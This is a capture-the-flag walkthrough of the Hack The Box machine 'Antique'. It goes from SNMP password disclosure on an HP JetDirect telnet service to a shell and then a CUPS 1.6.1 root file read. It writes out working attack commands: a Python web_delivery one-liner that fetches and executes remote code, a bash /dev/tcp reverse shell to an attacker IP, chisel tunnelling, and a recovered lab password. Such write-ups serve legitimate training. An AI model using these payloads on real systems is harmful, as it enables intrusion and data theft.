Summary
Antique is Linux machine CTF by hack the box. On this box, we will begin with a basic port 
scan and move laterally based on the findings. Then we will enumerate telnet service and 
hunt vulnerabilities present in a particular version. Laterally, we will exploit password 
disclosure vulnerability and obtain plain taxed passwords. Then we will be tasked to gain 
root access where we will need to perform port forwarding then we will read sensitive files 
by exploiting the file read vulnerability present on CUPS 1.6.1 version. In addition, we will 
be exploiting privilege and port forwarding using two different techniques.
Table of content
Initial Access
• Initial Nmap TCP Port Scan
• Telnet Banner Grabbing
• Searching for the exploit
• SNMP Enumeration
• User Shell
• User Flag
Privilege Escalation
• Port Forwarding with Metasploit
• Finding Privilege Escalation Vectors
• Exploit File read Vulnerability
• Root Flag
• Manual Method
• Port forwarding with chisel
• Root flag
Let’s exploit it step by step.
Initial Access
We are going to start the assessment with the normal TCP/IP port scanning.
Initial Nmap TCP Port Scan
We begin with the port scan where we are using nmap to find out which ports are open and 
what services are running in the target host. Nmap is a popular port scanning tool come 
with Kali Linux. To perform a port scan, we have used the –sV flag with full TCP ports 
against the target system which will scan full TCP ports with service version.
Flags features:
-sV: Attempts to determine the service version
-p-: Attempts to scan full ports
nmap -p- -sV 10.129.33.36
From the nmap scan, we have found telnet is open. Telnet is used to make remote 
connections. Many of the telnet version are vulnerable and it is not a secured protocol 
because it does not follow any encryption while communicating and transferring any 
message from one endpoint to another.
Telnet Banner Grabbing
While banner grabbing, it has shown an HP JetDirect and prompt for the password. By its 
name, it looks like a printer service which is managed by telnet protocol. Many times, 
administrators use a common password for the printers but did not work in our case.
Searching for the exploit
When we searched for the exploit related to HP Jet Direct, we found one exploit available 
which has a vulnerability to disclosing the device password. We downloaded the exploit 
and checked the source code we found it works with SNMP protocol. If we get the device 
password, then we can enumerate the device via telnet using credentials. But it is only 
possible if the SNMP protocol is open.
searchsploit HP JetDirect
searchsploit -m 22319
cat 22319.txt
SNMP Enumeration
This time, we are scanning only SNMP Service which is works on its default port 161 and 
follows UDP protocol. From the nmap scan result, we found that SNMP port is open and 
community name is public which is very common. Also, we found it is using SNMP version 1 
which is an insecure version as it does not follow encryption.
Flags features:
-sU: Attempts to scan UDP ports
-sV: Attempts to determine the service version
-p: Attempts to scan against given port
nmap -sU -sV -p 161 10.129.33.36
Next, we are following the exploit we found earlier which gave us some decimal 
values. Here we have given target IP address which is 10.129.33.36.
snmpget -v 1 -c public 10.129.33.36 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
Then, we copied all decimal contents and decoded them using cyberchef. Cyberchef is an 
online tool used to encode and decode. After decoding we got a plain taxed password:
P@ssw0rd@123!!123
Reference link: https://gchq.github.io/CyberChef/
User Shell
With obtained credentials, we logged in to telnet and used the help command (?). There we 
saw , we can use exec command which means we can execute any system commands from 
here.
Then we used the Metasploit script web delivery module which will create a server and 
send the payload to receive the reverse shell once the server started, we will use a python 
reverse shell. Execution of the reverse shell will give us a meterpreter session. To do that 
we have to provide the srvhost IP address and local host IP address and listening port, but 
we can skip lport as Metasploit picks it by itself and its default listening port is 4444. Please 
note, both srvhost and local IP address are the same as our kali machine IP address. More 
information about this module is available here:
https://www.rapid7.com/db/modules/exploit/multi/script/web_delivery/
use multi/script/web_delivery
set lhost 10.10.14.93
set srvhost 10.10.14.93
exploit
python3 -c "import sys;import 
ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.14.93:808
0/CzrKiV54o7', context=ssl._create_unverified_context());exec(r.read());"
User Flag
As we can see we have received a meterpreter shell. Now we can grab the user flag 
/var/spool/lpd directory. Also, if the meterpreter session is established then we can 
interact with the session number, here it is 1. Further enumeration of the internal network, 
we found an internet printing protocol is running on its default port 631.
Privilege Escalation
Privilege escalation is the process of exploiting a bug, design flaw or configuration oversight 
in an operating system or software application to gain elevated access to resources that are 
usually protected from an application or user. Privilege escalation can be used by attackers 
to gain access to more system functions and data than intended by the root user. In some 
cases, privilege escalation can allow attackers to control the system completely.
Port Forwarding with Metasploit
To enumerate port 631, we will forward its port to our kali system so it will be accessible 
from there. Here we have the port number we want to access in our kali loopback interface 
and the port number we want to forward to our kali system which is 631.
portfwd add -l 8082 -p 631 -r 127.0.0.1
Finding Privilege Escalation Vectors
Accessing it over browser from our kali, opened a web page where we found CUPS version 
1.6.1.
Exploit File read Vulnerability
The CUPS version 1.6.1 is vulnerable to root file read. We found a Metasploit module that is 
also available there. Then we switched to the module where we provided the current 
session ID, and the file name that we want to read, where we have given root.txt.
use post/multi/escalate/cups_root_file_read
set session 1
set file /root/root.txt
Root flag
After execution of the exploit, it will save the output to /root/.msf4/loot directory. There 
we can use the cat command to view the contents of roo.txt. Now we can submit the root 
flag.
Manual Method
Let’s try with manual way, we will exploit the root file read vulnerability from port 
forwarding. In many exam settings, we are not allowed to use automated tools, so we also 
need to consider working in a manual way as well.
Port forwarding with chisel
For the port forwarding, we need to download the chisel and transfer it to the target 
machine. Chisel is a great tool used for pivoting and it is used by many penetration testers 
during their internal assessments. Make sure to download the amd64 architecture 
only. The download link is given below:
https://github.com/jpillora/chisel
Once its download, we will unzip it and turn on the python server on port 80 to transfer it 
to the target system.
gunzip chisel_1.7.7_linux_amd64.gz
python3 -m http.server 80
We also need to set up a chisel server on our kali system to make them communicate with 
each other. Firstly, we need to give full permission to execute. Next, we will set up a chisel 
server on port 5000.
chmod 777 chisel_1.7.7_linux_amd64.gz
./ chisel_1.7.7_linux_amd64.gz server -p 5000 --reverse
Then we will take a reverse shell after authenticating via telnet with obtained 
password: P@ssw0rd@123!!123. After logging in to telnet we will take reverse shell using 
exec command, here we are using bash one-liner reverse shell. Do not forget to turn on the 
netcat listener on port 1234 before executing the bash one-liner.
On kali terminal 1:
telnet 10.129.33.36
On kali terminal 2:
Nc -nlvp 1234
On kali terminal 1:
exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
Next, we will download chisel in the target systems /tmp folder.
wget 10.10.14.93/chisel_1.7.7_linux_amd64
Once we download the chisel on the target system, we will give full permission so we can 
execute it. Here we need to provide a few details to set up the chisel client such as the 
attacker Ip address (10.10.14.93), attacker side chisel server port (5000), remote port 
(5432) where we want to access service than local host and local internal port (631) that 
we wish to forward.
./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631
Once we forward the port then we can access it from kali over the browser on loopback IP 
or localhost on port 5432.
Root Flag
When we checked groups, we found that current users belong to lpadmin group. As cups is 
accessible from the kali browser, here we are changing the error log path to 
/root/root.txt. Once we do that, we can check the root.txt file over the browser. Before 
changing the error log path, we could be able to see only error logs on the browser but after 
changing its path we will be able to read any files we wish to read.
The error logs are stored in the /admin/log directory. Checking the error log over the 
browser, we got root.txt content instead of any error. Now we can submit the root flag.
